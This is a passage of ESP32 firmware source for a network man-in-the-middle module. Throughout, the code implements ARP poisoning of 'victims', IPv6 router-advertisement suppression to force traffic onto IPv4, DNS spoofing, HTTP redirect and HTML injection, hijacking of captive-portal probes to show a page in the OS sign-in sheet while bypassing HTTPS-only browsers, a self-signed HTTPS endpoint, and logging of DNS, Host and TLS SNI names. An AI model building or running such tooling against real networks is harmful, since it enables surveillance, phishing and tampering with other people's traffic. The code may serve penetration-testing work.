    for (size_t i = 0; i < sizeof(probePaths) / sizeof(probePaths[0]); i++) {
        if (path.indexOf(probePaths[i]) == 0) return true;
    }
    return false;
}

/// Handle one queued HTTP request: match a rule and answer it.
static void _handleHttp(NetSpoofSlot *slot) {
    s_httpRequests++;

    String method, path, host;
    _parseHttp(slot->data, slot->copyLen, method, path, host);
    String url = "http://" + host + path;

    NetSpoofWebDecision d;
    _webDecide(host, url, d);

    if (d.redirect < 0 && d.inject < 0) {
        _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), 0);
        return;
    }

    // A captive-portal probe while any rule is armed. With a `portal` page this
    // answers 200 + that HTML, so the OS sign-in sheet renders it directly; a
    // plain redirect payload answers 302 to its own target. Either way the page
    // appears without the user's browser or its certificate rules being involved.
    bool probe = (d.inject >= 0 || d.redirect >= 0) && _portalProbe(host, path);

    // The response must fit one ethernet frame: 1514 - 14 eth - 20 ip - 20 tcp.
    const size_t kMaxPayload = 1450;
    size_t payloadLen;
    uint8_t action = 0;
    if (probe) {
        String body = netspoof_http_portal_page();
        if (body.length()) {
            payloadLen = _buildHttpResponse(
                (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", body, String()
            );
            action = 2;
        } else {
            String loc = d.redirect >= 0 ? d.location : ("http://" + WiFi.localIP().toString() + "/");
            payloadLen = _buildHttpResponse(
                (char *)s_l4b, kMaxPayload, 302, "Found", "text/html; charset=utf-8", String(), loc
            );
            action = 1;
        }
        if (payloadLen) {
            Serial.printf("[NETSPOOF] captive probe %s%s\n", host.c_str(), path.c_str());
        }
    } else if (d.redirect >= 0) {
        // A long Location is trimmed: an over-long redirect is worse than a
        // slightly different one, because an oversized frame never leaves.
        while (d.location.length() > 900) d.location = d.location.substring(0, d.location.length() - 1);
        payloadLen = _buildHttpResponse(
            (char *)s_l4b, kMaxPayload, 302, "Found", NULL, String(), d.location
        );
        action = 1;
    } else {
        payloadLen = _buildHttpResponse(
            (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", d.html, String()
        );
        action = 2;
    }
    if (payloadLen == 0) {
        _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), 0);
        return;
    }

    // The client's ACK is the sequence number it expects next from the server,
    // and our segment has to acknowledge everything the client sent.
    uint32_t ack = slot->seq + slot->payloadLen;
    if (slot->flags & 0x02) ack++; // SYN
    if (slot->flags & 0x01) ack++; // FIN

    bool sent = _txTcpRaw(
        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x18,
        s_l4b, payloadLen
    );
    if (sent) {
        // The response says Connection: close, so close too. Without the FIN the
        // client keeps a half-open socket until its own timeout (curl and the
        // raw test client both waited the full 5-8 s for an EOF that never came).
        _txTcpRaw(
            slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort,
            slot->ack + payloadLen, ack, 0x11, NULL, 0
        );
        if (action == 1) s_httpRedirected++;
        else s_httpInjected++;
    }
    _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), sent ? action : 0);
}

/**
 * @brief Extract the SNI host name from a TLS ClientHello.
 *
 * Only the first record is inspected; a ClientHello normally fits in one and
 * the hook copies 640 bytes. Every length is bounds-checked, so a malformed or
 * truncated hello simply yields an empty name instead of reading past the
 * captured bytes.
 */
static bool _tlsSni(const uint8_t *d, size_t len, char *out, size_t cap) {
    if (out == nullptr || cap == 0) return false;
    out[0] = '\0';
    if (len < 9 || d[0] != 0x16 || d[1] != 0x03) return false; // TLS handshake

    size_t recordLen = ((size_t)d[3] << 8) | d[4];
    size_t end = 5 + recordLen;
    if (recordLen == 0 || end > len) end = len; // truncated copy: parse what we have

    const uint8_t *hs = d + 5;
    size_t hsLen = end - 5;
    if (hsLen < 4 || hs[0] != 0x01) return false; // ClientHello
    size_t helloLen = ((size_t)hs[1] << 16) | ((size_t)hs[2] << 8) | hs[3];
    if (helloLen + 4 < hsLen) hsLen = helloLen + 4;

    size_t p = 4;
    if (p + 34 > hsLen) return false; // version + random
    p += 34;
    if (p + 1 > hsLen) return false;
    size_t sid = hs[p++];
    if (p + sid > hsLen) return false;
    p += sid;
    if (p + 2 > hsLen) return false;
    size_t cs = ((size_t)hs[p] << 8) | hs[p + 1];
    p += 2;
    if (p + cs > hsLen) return false;
    p += cs;
    if (p + 1 > hsLen) return false;
    size_t cm = hs[p++];
    if (p + cm > hsLen) return false;
    p += cm;
    if (p + 2 > hsLen) return false;
    size_t extLen = ((size_t)hs[p] << 8) | hs[p + 1];
    p += 2;
    size_t extEnd = p + extLen;
    if (extEnd > hsLen) extEnd = hsLen;

    while (p + 4 <= extEnd) {
        uint16_t type = ((uint16_t)hs[p] << 8) | hs[p + 1];
        size_t elen = ((size_t)hs[p + 2] << 8) | hs[p + 3];
        p += 4;
        if (p + elen > extEnd) break;
        if (type == 0 && elen >= 5) { // server_name
            const uint8_t *e = hs + p;
            size_t listLen = ((size_t)e[0] << 8) | e[1];
            size_t listEnd = 2 + listLen;
            if (listEnd > elen) listEnd = elen;
            size_t q = 2;
            while (q + 3 <= listEnd) {
                uint8_t nameType = e[q];
                size_t nlen = ((size_t)e[q + 1] << 8) | e[q + 2];
                q += 3;
                if (q + nlen > listEnd) break;
                if (nameType == 0 && nlen > 0) {
                    size_t n = nlen < cap - 1 ? nlen : cap - 1;
                    for (size_t i = 0; i < n; i++) {
                        char c = (char)e[q + i];
                        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
                        out[i] = c;
                    }
                    out[n] = '\0';
                    return n > 0;
                }
                q += nlen;
            }
        }
        p += elen;
    }
    return false;
}

/**
 * @brief A TLS connection to a remote address: record its SNI, then reset it.
 *
 * This is the cached-IP / secure-DNS case: the client never asked us for the
 * address, so it is not talking to this board's TLS endpoint and a redirect
 * cannot be forged. Logging the host and failing the connection is the honest
 * result; when the DNS answer did point here the connection is delivered to the
 * secure server instead and never reaches this function.
 */
static void _handleTls(NetSpoofSlot *slot) {
    char sni[80] = {0};
    bool have = _tlsSni(slot->data, slot->copyLen, sni, sizeof(sni));
    String m = _macStr(slot->clientMac);
    _capturePushEx(
        NETSPOOF_CAPTURE_HTTPS, slot->srcIp, m.c_str(), "TLS", have ? sni : "", "",
        have ? "ClientHello" : "ClientHello (no SNI)", 0
    );
    uint32_t ack = slot->seq + slot->payloadLen;
    _txTcpRaw(
        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x14,
        NULL, 0
    );
}

/**
 * @brief Record what one frame says, without answering it.
 *
 * The recon path (a payload with no page/redirect/DNS rule, only `forward` and
 * `info`/`probe`) has to show which domains a network visits without changing a
 * single packet. With no rule armed the engines answer nothing, so they would
 * record nothing either; this walks the same headers they do and pushes a
 * capture for the DNS question name, the plaintext HTTP Host header and the TLS
 * SNI - together, "the domains this network is talking to". Action 0 means
 * observed only, so the run feed prints it as a plain visit.
 */
static void _observeFrame(
    const uint8_t *frame, uint16_t total, uint8_t ihl, uint8_t proto, uint32_t srcIp, uint32_t dstIp
) {
    if (total < (uint16_t)(14 + ihl)) return;
    const uint8_t *l4 = frame + 14 + ihl;
    uint16_t avail = (uint16_t)(total - 14 - ihl);
    if (avail < 8) return;
    uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
    uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
    String mac = _macStr(frame + 6);

    if (proto == 17) {
        if (dstPort != 53) return;
        uint16_t udpLen = ((uint16_t)l4[4] << 8) | l4[5];
        if (udpLen < 8 || udpLen > avail) return;
        uint16_t txid = 0, qtype = 0, qclass = 0;
        char name[80];
        if (!_dnsQuestion(l4 + 8, (size_t)(udpLen - 8), &txid, name, sizeof(name), &qtype, &qclass)) return;
        s_dnsQueries++;
        _capturePushEx(NETSPOOF_CAPTURE_DNS, srcIp, mac.c_str(), "DNS", name, "", "", 0);
        return;
    }

    if (proto != 6 || avail < 20) return;
    uint8_t dataOff = (uint8_t)((l4[12] >> 4) * 4);
    if (dataOff < 20 || (uint16_t)(dataOff + 1) > avail) return;
    uint16_t ipTotal = ((uint16_t)frame[16] << 8) | frame[17]; // IPv4 total length
    if (ipTotal < (uint16_t)(ihl + dataOff)) return;
    uint16_t payloadLen = (uint16_t)(ipTotal - ihl - dataOff);
    if (payloadLen == 0) return;
    uint16_t copyLen = (uint16_t)(avail - dataOff);
    if (copyLen > payloadLen) copyLen = payloadLen;
    if (copyLen > NETSPOOF_HOOK_COPY) copyLen = NETSPOOF_HOOK_COPY;
    if (copyLen == 0) return;
    const uint8_t *payload = l4 + dataOff;

    if (copyLen >= 3 && payload[0] == 0x16 && payload[1] == 0x03) {
        char sni[80] = {0};
        bool have = _tlsSni(payload, copyLen, sni, sizeof(sni));
        _capturePushEx(
            NETSPOOF_CAPTURE_HTTPS, srcIp, mac.c_str(), "TLS", have ? sni : "", "",
            have ? "ClientHello" : "ClientHello (no SNI)", 0
        );
        return;
    }
    if (_looksHttp((const char *)payload, copyLen)) {
        String method, path, host;
        _parseHttp(payload, copyLen, method, path, host);
        if (dstPort != 80) path = ":" + String(dstPort) + path;
        _capturePushEx(
            NETSPOOF_CAPTURE_HTTP, srcIp, mac.c_str(), method.c_str(), host.c_str(), path.c_str(), "", 0
        );
    }
}

/// A non-HTTP TCP flow: reset it so the client fails fast instead of hanging.
static void _handleOtherTcp(NetSpoofSlot *slot) {
    uint32_t ack = slot->seq + slot->payloadLen;
    _txTcpRaw(
        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x14,
        NULL, 0
    );
}

// ===========================================================================
// 7. Service task
// ===========================================================================

static void _svcLoop(void *arg) {
    (void)arg;
    uint32_t lastPoison = 0;

    while (s_svcRun) {
        NetSpoofSlot *slot = _slotTake();
        if (slot) {
            if (slot->kind == 0) {
                if (s_dnsActive) _handleDns(slot);
            } else if (slot->kind == 2) {
                if (s_httpActive || s_httpsActive) _handleSyn(slot);
            } else if (slot->kind == 3) {
                if (s_httpActive || s_httpsActive) _handleTls(slot);
            } else if (slot->kind == 4) {
                if (s_httpActive || s_httpsActive) _handleOtherTcp(slot);
            } else {
                if (s_httpActive) _handleHttp(slot);
            }
            _slotRelease(slot);
        }

        uint32_t now = millis();
        int livePairs = _pairCountNow();
        // Re-poison period scales with the pair count. Two ARP frames per pair
        // every 250 ms is 1600 frames/s of airtime at 200 pairs, which starves
        // the very traffic it is supposed to carry; one pass per ~1.8 s still
        // refreshes every cache well inside the 20 s ARP entry timeout.
        uint32_t poisonPeriod = NETSPOOF_POISON_INTERVAL_MS + (uint32_t)livePairs * 8;
        if (now - lastPoison >= poisonPeriod) {
            lastPoison = now;
            for (int i = 0; i < livePairs; i++) {
                NetSpoofPair p;
                if (_pairCopy(i, &p)) _poisonPair(p, 1);
            }
        }

        // Keep IPv6 retired for the poisoned clients: a modern device with a
        // working IPv6 default route resolves and streams over it, and none of
        // that traffic ever reaches the IPv4 poison. The RA is unicast to each
        // victim, so no other host on the network is affected. It runs whenever
        // something is being intercepted, not only while forwarding: a
        // DNS-only attack (or a payload whose `forward auto` failed) is exactly
        // the case where the victim's IPv6 resolver would keep answering every
        // name for real, and the RA also carries the RDNSS lifetime 0 that makes
        // Android fall back to its IPv4 resolver - without that, `https://`
        // names never reached this engine at all.
        if (s_forwardActive || s_dnsActive || s_httpsActive) {
            static uint32_t lastRa = 0;
            if (now - lastRa >= (uint32_t)(1500 + livePairs * 10)) {
                lastRa = now;
                for (int i = 0; i < livePairs; i++) {
                    NetSpoofPair p;
                    if (_pairCopy(i, &p)) _sendRaRetire(p.targetMac, p.gatewayMac);
                }
            }
        }

        vTaskDelay(pdMS_TO_TICKS(NETSPOOF_SVC_TICK_MS));
    }

    s_svcTask = NULL;
    vTaskDelete(NULL);
}

static void _svcStart() {
    if (s_svcTask) return;
    s_svcRun = true;
    if (xTaskCreateUniversal(
            _svcLoop, "netspoofSvc", 4096, NULL, 1, &s_svcTask, ARDUINO_RUNNING_CORE
        ) != pdPASS) {
        s_svcTask = NULL;
        s_svcRun = false;
        Serial.println("[NETSPOOF] could not start the service task");
    }
}

static void _svcStopIfIdle() {
    if (s_svcTask && !netspoof_arp_active() && !s_dnsActive && !s_httpActive && !s_httpsActive && !s_observe) {
        s_svcRun = false;
    }
}

// --- Observe-only recon ---------------------------------------------------

bool netspoof_observe_active() { return s_observe; }

bool netspoof_observe_start(String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    _svcStart();
    _hookInstall();
    s_observe = true;
    err = "";
    return true;
}

void netspoof_observe_stop() {
    s_observe = false;
    // Forwarding owns the hook while it is up (it bridges through it), so only
    // drop it when nothing else needs it.
    if (!s_dnsActive && !s_httpActive && !s_httpsActive && !s_forwardActive) _hookUninstall();
    _svcStopIfIdle();
}

// ===========================================================================
// 8. DNS / HTTP public API
// ===========================================================================

bool netspoof_dns_active() { return s_dnsActive; }
uint32_t netspoof_dns_queries() { return s_dnsQueries; }
uint32_t netspoof_dns_answers() { return s_dnsAnswers; }

// Transport-fallback counters (1.4). See _mitmFallbackGuard().
uint32_t netspoof_quic_dropped() { return s_quicDropped; }
uint32_t netspoof_dot_dropped() { return s_dotDropped; }
uint32_t netspoof_svcb_suppressed() { return s_svcbSuppressed; }
uint32_t netspoof_ipv6_dropped() { return s_ipv6Dropped; }

bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard, String &err) {
    IPAddress parsed;
    String value = ip;
    value.trim();
    bool token = _dnsValueIsToken(value);
    if (!token && !parsed.fromString(value.c_str())) {
        err = "invalid IPv4 address: " + ip;
        return false;
    }
    if (token) value.toLowerCase();
    if (wildcard && domain.length() == 0) {
        // ok: startAll('*', ip)
    } else if (domain.length() == 0) {
        err = "domain is required";
        return false;
    }

    _ensure_mutex();
    _lock();
    if (s_dnsRuleCount >= NETSPOOF_MAX_RULES) {
        _unlock();
        err = "too many DNS rules (max " + String(NETSPOOF_MAX_RULES) + "); clearRules() first";
        return false;
    }
    // Replace an existing rule for the same pattern.
    for (int i = 0; i < s_dnsRuleCount; i++) {
        if (s_dnsRules[i].match.equalsIgnoreCase(domain)) {
            s_dnsRules[i].value = token ? value : parsed.toString();
            s_dnsRules[i].wildcard = wildcard;
            _unlock();
            return true;
        }
    }
    NetSpoofRule &r = s_dnsRules[s_dnsRuleCount++];
    r.match = domain;
    r.match.toLowerCase();
    r.value = token ? value : parsed.toString();
    r.wildcard = wildcard;
    r.hits = 0;
    _unlock();
    return true;
}

void netspoof_dns_clear_rules() {
    _ensure_mutex();
    _lock();
    s_dnsRuleCount = 0;
    _unlock();
}

int netspoof_dns_rule_count() {
    _lock();
    int n = s_dnsRuleCount;
    _unlock();
    return n;
}

const NetSpoofRule *netspoof_dns_rule(int idx) {
    if (idx < 0 || idx >= s_dnsRuleCount) return NULL;
    return &s_dnsRules[idx];
}

bool netspoof_dns_start(String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    _ensure_mutex();
    if (netspoof_dns_rule_count() == 0) {
        err = "no DNS rules; call dnsSpoof.start(domain, ip) or dnsSpoof.startAll('*', ip) first";
        return false;
    }
    _svcStart();
    _hookInstall();
    s_dnsActive = true;
    err = "";
    return true;
}

bool netspoof_dns_stop(String &err) {
    (void)err;
    // The HTTPS endpoint answers every A record with this board's address, so
    // it owns an active DNS responder for as long as it runs. Stopping DNS
    // underneath it would silently break every HTTPS redirect; HTTPS stop
    // releases the responder when it no longer needs it.
    if (s_httpsActive) return true;
    s_dnsActive = false;
    if (!s_httpActive) _hookUninstall();
    _svcStopIfIdle();
    return true;
}

bool netspoof_http_active() { return s_httpActive; }
uint32_t netspoof_http_requests() { return s_httpRequests; }
uint32_t netspoof_http_redirected() { return s_httpRedirected; }
uint32_t netspoof_http_injected() { return s_httpInjected; }

static bool _httpAddRule(NetSpoofRule *list, int &count, const String &pattern, const String &value, bool wildcard, String &err) {
    if (!wildcard && pattern.length() == 0) {
        err = "pattern is required (use '*' or pass wildcard)";
        return false;
    }
    if (value.length() == 0) {
        err = "value is required";
        return false;
    }
    _ensure_mutex();
    _lock();
    if (count >= NETSPOOF_MAX_RULES) {
        _unlock();
        err = "too many rules (max " + String(NETSPOOF_MAX_RULES) + "); clearRules() first";
        return false;
    }
    for (int i = 0; i < count; i++) {
        if (list[i].match.equalsIgnoreCase(pattern)) {
            list[i].value = value;
            list[i].wildcard = wildcard;
            _unlock();
            return true;
        }
    }
    NetSpoofRule &r = list[count++];
    r.match = pattern;
    r.match.toLowerCase();
    r.value = value;
    r.wildcard = wildcard;
    r.hits = 0;
    _unlock();
    return true;
}

/// Host part of a URL ("https://www.youtube.com:443/watch?x=1" ->
/// "www.youtube.com").
static String _urlHost(const String &url) {
    int p = url.indexOf("://");
    int start = (p >= 0) ? p + 3 : 0;
    int end = url.length();
    for (int i = start; i < (int)url.length(); i++) {
        char c = url[i];
        if (c == '/' || c == ':' || c == '?' || c == '#') {
            end = i;
            break;
        }
    }
    String h = url.substring(start, end);
    h.trim();
    h.toLowerCase();
    return h;
}

void netspoof_dns_add_passthrough(const String &host) {
    String h = host;
    h.trim();
    h.toLowerCase();
    if (h.length() == 0) return;
    for (int i = 0; i < s_passCount; i++) {
        if (s_passHosts[i] == h) return;
    }
    if (s_passCount < NETSPOOF_DNS_PASS_MAX) s_passHosts[s_passCount++] = h;
    else s_passHosts[NETSPOOF_DNS_PASS_MAX - 1] = h; // newest wins
}

void netspoof_dns_clear_passthrough() { s_passCount = 0; }

// --- transparent forwarding API -------------------------------------------

bool netspoof_forward_start(String &err) {
    if (!WiFi.isConnected()) {
        err = "forwarding needs the station link";
        return false;
    }
    IPAddress gw;
    uint8_t mac[6];
    if (!netspoof_gateway_info(gw, mac)) {
        err = "gateway unknown (ARP table empty)";
        return false;
    }
    // `netspoof_gateway_info()` falls back to the AP's BSSID, which is its
    // Wi-Fi address - not the router's LAN MAC. Forwarding a victim frame there
    // never reaches the gateway, so force a real ARP resolution first and treat
    // a failure as "no forwarding" (the payload then falls back to its page).
    uint8_t resolved[6];
    if (netspoof_resolve_mac(gw, resolved, 1500)) {
        memcpy(mac, resolved, 6);
    } else {
        err = "gateway MAC unresolved (no ARP answer)";
        return false;
    }
    memcpy(s_gwMac, mac, 6);
    s_gwMacOk = true;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
    _fwdPeersClear();
    s_forwardActive = true;
    Serial.printf("[NETSPOOF] forwarding ON via %s\n", _macStr(s_gwMac).c_str());
    return true;
}

void netspoof_forward_stop() {
    if (!s_forwardActive) return;
    s_forwardActive = false;
    s_gwMacOk = false;
    _fwdPeersClear();
    Serial.printf(
        "[NETSPOOF] forwarding OFF (%lu frames, %lu bytes, %lu failed)\n", (unsigned long)s_fwdFrames,
        (unsigned long)s_fwdBytes, (unsigned long)s_fwdDropped
    );
}

bool netspoof_forward_active() { return s_forwardActive; }
uint32_t netspoof_forward_frames() { return s_fwdFrames; }
uint32_t netspoof_forward_dropped() { return s_fwdDropped; }

bool netspoof_http_add_redirect(const String &pattern, const String &url, bool wildcard, String &err) {
    bool ok = _httpAddRule(s_redirRules, s_redirCount, pattern, url, wildcard, err);
    // The host the redirect points at has to keep resolving for real, or the
    // client is sent back to this board (which cannot fetch it) and loops.
    if (ok) netspoof_dns_add_passthrough(_urlHost(url));
    return ok;
}

bool netspoof_http_add_injection(const String &pattern, const String &html, bool wildcard, String &err) {
    return _httpAddRule(s_injectRules, s_injectCount, pattern, html, wildcard, err);
}

/// Arm the page that answers the OS captive-portal probe.
///
/// This is the modern-client route: every current phone decides "is this network
/// captive?" with one plaintext request and then opens the answer in its own
/// sign-in sheet. That sheet is not the browser the user launched, so an
/// HTTPS-only browser (DuckDuckGo, an iPhone with a locked-down Safari) cannot
/// refuse it and no certificate is involved.
void netspoof_http_set_portal_page(const String &html) {
    _ensure_mutex();
    _lock();
    s_portalPage = html;
    _unlock();
}

String netspoof_http_portal_page() {
    _ensure_mutex();
    _lock();
    String copy = s_portalPage;
    _unlock();
    return copy;
}

void netspoof_http_clear_rules() {
    _ensure_mutex();
    _lock();
    s_redirCount = 0;
    s_injectCount = 0;
    s_portalPage = "";
    _unlock();
}

void netspoof_http_clear_injections() {
    _ensure_mutex();
    _lock();
    s_injectCount = 0;
    _unlock();
}

void netspoof_http_clear_redirects() {
    _ensure_mutex();
    _lock();
    s_redirCount = 0;
    _unlock();
}

int netspoof_http_redirect_count() {
    _lock();
    int n = s_redirCount;
    _unlock();
    return n;
}

int netspoof_http_inject_count() {
    _lock();
    int n = s_injectCount;
    _unlock();
    return n;
}

const NetSpoofRule *netspoof_http_redirect_rule(int idx) {
    if (idx < 0 || idx >= s_redirCount) return NULL;
    return &s_redirRules[idx];
}

const NetSpoofRule *netspoof_http_inject_rule(int idx) {
    if (idx < 0 || idx >= s_injectCount) return NULL;
    return &s_injectRules[idx];
}

bool netspoof_http_start(String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    _svcStart();
    _hookInstall();
    s_httpActive = true;

    // The plaintext interceptor works on its own; the HTTPS endpoint is what
    // makes the same rules apply to https:// too. A TLS start failure (usually
    // RAM) must not take the plaintext path down with it.
    String httpsErr;
    if (!netspoof_https_start(httpsErr)) {
        Serial.printf("[NETSPOOF] https unavailable: %s\n", httpsErr.c_str());
    }

    // No rules is allowed: the interceptor then only records what it sees.
    err = "";
    return true;
}

bool netspoof_http_stop(String &err) {
    (void)err;
    String httpsErr;
    netspoof_https_stop(httpsErr);
    s_httpActive = false;
    if (!s_dnsActive) _hookUninstall();
    _svcStopIfIdle();
    return true;
}

// ===========================================================================
// 8b. HTTPS endpoint (self-signed TLS, same rules as HTTP)
// ===========================================================================

uint16_t netspoof_https_port() { return NETSPOOF_HTTPS_PORT; }

/// HTTP method name for a httpd request (HTTP_ANY handlers see every method).
static const char *_httpsMethodName(int method) {
    switch (method) {
        case HTTP_GET: return "GET";
        case HTTP_POST: return "POST";
        case HTTP_PUT: return "PUT";
        case HTTP_DELETE: return "DELETE";
        case HTTP_HEAD: return "HEAD";
        case HTTP_OPTIONS: return "OPTIONS";
        case HTTP_PATCH: return "PATCH";
        case HTTP_TRACE: return "TRACE";
        case HTTP_CONNECT: return "CONNECT";
        default: return "HTTP";
    }
}

/**
 * @brief Record one HTTPS request, including the peer address.
 *
 * httpd does not expose the peer address on the request object, so it is read
 * from the accepted socket and mapped back to a MAC through the ARP table (the
 * MAC is cosmetic; the IP is the useful part).
 */
static void _httpsPushCapture(
    httpd_req_t *req, const char *method, const String &host, const String &path, uint8_t action
) {
    uint32_t ipWire = 0;
    char macStr[18] = "00:00:00:00:00:00";
    int fd = httpd_req_to_sockfd(req);
    if (fd >= 0) {
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        memset(&sa, 0, sizeof(sa));
        if (getpeername(fd, (struct sockaddr *)&sa, &sl) == 0 && sa.sin_family == AF_INET) {
            ipWire = sa.sin_addr.s_addr;
            IPAddress peer(ipWire);
            uint8_t mac[6];
            if (_arpTableLookup(peer, mac) && !_isZeroMac(mac)) {
                String m = _macStr(mac);
                strncpy(macStr, m.c_str(), sizeof(macStr) - 1);
            }
        }
    }
    String reqLine = String(method) + " " + path + " HTTP/1.1";
    _capturePushEx(
        NETSPOOF_CAPTURE_HTTPS, ipWire, macStr, method, host.c_str(), path.c_str(), reqLine.c_str(), action
    );
}

/**
 * @brief Catch-all handler for the HTTPS endpoint.
 *
 * Applies the same redirect/injection rules as the plaintext interceptor, so a
 * `redirect * http://...` payload now covers an https:// request as well. The
 * TLS layer has already presented the self-signed certificate by the time this
 * runs; the client has either accepted the warning or does not validate.
 */
static esp_err_t _httpsHandler(httpd_req_t *req) {
    if (!s_httpsActive) {
        httpd_resp_set_status(req, "503 Service Unavailable");
        httpd_resp_send(req, "not running", 11);
        return ESP_OK;
    }

    String host;
    char hostBuf[64];
    if (httpd_req_get_hdr_value_str(req, "Host", hostBuf, sizeof(hostBuf)) == ESP_OK) {
        host = hostBuf;
        host.trim();
    }
    host.toLowerCase();

    String path = req->uri[0] ? req->uri : "/";
    if (path.length() > 95) path = path.substring(0, 95); // capture field width
    const char *method = _httpsMethodName(req->method);
    String url = "https://" + host + path;

    NetSpoofWebDecision d;
    _webDecide(host, url, d);

    s_httpsRequests++;
    if (d.redirect < 0 && d.inject < 0) {
        _httpsPushCapture(req, method, host, path, 0);
        httpd_resp_set_status(req, "404 Not Found");
        httpd_resp_set_type(req, "text/plain; charset=utf-8");
        httpd_resp_send(req, "no rule", 7);
        return ESP_OK;
    }

    if (d.redirect >= 0) {
        _httpsPushCapture(req, method, host, path, 1);
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", d.location.c_str());
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_send(req, NULL, 0);
        s_httpsRedirected++;
    } else {
        _httpsPushCapture(req, method, host, path, 2);
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html; charset=utf-8");
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_send(req, d.html.c_str(), d.html.length());
        s_httpsInjected++;
    }
    return ESP_OK;
}

bool netspoof_https_start(String &err) {
    if (s_httpsActive) return true;
    if (!netspoof_wifi_ready(err)) return false;

    // The TLS record buffers must come from PSRAM here; see the allocator note
    // above. Set before httpd_ssl_start() parses the certificate and creates
    // the first SSL context.
    _ensureMbedtlsPsram();
    _ensure_mutex();

    httpd_ssl_config_t cfg = HTTPD_SSL_CONFIG_DEFAULT();
    cfg.servercert = (const uint8_t *)NETSPOOF_HTTPS_CERT;
    cfg.servercert_len = sizeof(NETSPOOF_HTTPS_CERT);
    cfg.prvtkey_pem = (const uint8_t *)NETSPOOF_HTTPS_KEY;
    cfg.prvtkey_len = sizeof(NETSPOOF_HTTPS_KEY);
    cfg.port_secure = NETSPOOF_HTTPS_PORT;
    cfg.transport_mode = HTTPD_SSL_TRANSPORT_SECURE;
    cfg.tls_handshake_timeout_ms = 8000;

    // One TLS socket is ~40 KB of internal RAM. Keep the pool at one (clients
    // are still accepted back-to-back) so the MITM engine and the Wi-Fi driver
    // keep their headroom; lru_purge evicts a stuck handshake rather than
    // exhausting the pool.
    cfg.httpd.max_open_sockets = 1;
    cfg.httpd.stack_size = 12288;
    cfg.httpd.core_id = tskNO_AFFINITY;
    cfg.httpd.lru_purge_enable = true;
    cfg.httpd.recv_wait_timeout = 5;
    cfg.httpd.send_wait_timeout = 5;
    cfg.httpd.uri_match_fn = httpd_uri_match_wildcard;

    esp_err_t e = httpd_ssl_start(&s_httpsServer, &cfg);
    if (e != ESP_OK) {
        s_httpsServer = NULL;
        err = String("https server start failed: ") + esp_err_to_name(e);
        return false;
    }

    httpd_uri_t uri = {};
    uri.uri = "/*";
    uri.method = (httpd_method_t)HTTP_ANY;
    uri.handler = _httpsHandler;
    uri.user_ctx = NULL;
    e = httpd_register_uri_handler(s_httpsServer, &uri);
    if (e != ESP_OK) {
        httpd_ssl_stop(s_httpsServer);
        s_httpsServer = NULL;
        err = String("https handler registration failed: ") + esp_err_to_name(e);
        return false;
    }

    // A client that rejects the self-signed certificate aborts the handshake and
    // retries, and esp_https_server logs every failed session at ERROR. That is
    // expected here (the certificate is self-signed by design) and a busy client
    // can emit dozens of those lines a second, flooding the console and the USB
    // debug channel for the whole run. Mute that one tag while the endpoint is
    // up; netspoof_https_stop() restores the default.
    esp_log_level_set("esp_https_server", ESP_LOG_NONE);

    s_httpsActive = true;
    // The victim must be able to reach this endpoint, so the DNS responder has
    // to run even when the payload has no `dns` line. If it was already up,
    // leave ownership alone and the user's rules survive HTTPS stopping.
    _svcStart();
    _hookInstall();
    if (!s_dnsActive) {
        s_dnsActive = true;
        s_httpsOwnsDns = true;
    }
    Serial.printf(
        "[NETSPOOF] https endpoint on :%d (self-signed; clients must accept the warning)\n",
        NETSPOOF_HTTPS_PORT
    );
    err = "";
    return true;
}

bool netspoof_https_stop(String &err) {
    (void)err;
    if (s_httpsServer) {
        httpd_ssl_stop(s_httpsServer);
        s_httpsServer = NULL;
        esp_log_level_set("esp_https_server", ESP_LOG_ERROR);
    }
    bool was = s_httpsActive;
    s_httpsActive = false;
    if (s_httpsOwnsDns) {
        s_httpsOwnsDns = false;
        if (!s_httpActive) s_dnsActive = false;
    }
    if (!s_httpActive && !s_dnsActive) _hookUninstall();
    _svcStopIfIdle();
    if (was) Serial.println("[NETSPOOF] https endpoint stopped");
    return true;
}

bool netspoof_https_active() { return s_httpsActive; }
uint32_t netspoof_https_requests() { return s_httpsRequests; }
uint32_t netspoof_https_redirected() { return s_httpsRedirected; }
uint32_t netspoof_https_injected() { return s_httpsInjected; }

// ===========================================================================
// 9. Captures
// ===========================================================================

int netspoof_capture_count() { return s_captureCount; }

uint32_t netspoof_capture_total() { return s_captureTotal; }

const char *netspoof_capture_kind_name(uint8_t kind) {
    switch (kind) {
        case NETSPOOF_CAPTURE_DNS: return "dns";
        case NETSPOOF_CAPTURE_HTTPS: return "https";
        default: return "http";
    }
}

const NetSpoofCapture *netspoof_capture(int idx) {
    NetSpoofCapture *ring = s_captures();
    if (idx < 0 || idx >= s_captureCount || ring == nullptr) return NULL;
    return &ring[idx];
}

void netspoof_capture_clear() { s_captureCount = 0; }

// ===========================================================================
// 10. Lifecycle
// ===========================================================================

void netspoof_cleanup() {
    String httpsErr;
    netspoof_forward_stop();
    netspoof_dns_clear_passthrough();
    netspoof_https_stop(httpsErr);
    s_dnsActive = false;
    s_httpActive = false;
    _hookUninstall();
    // Always restore the victims' ARP caches. Vandeta made this optional through
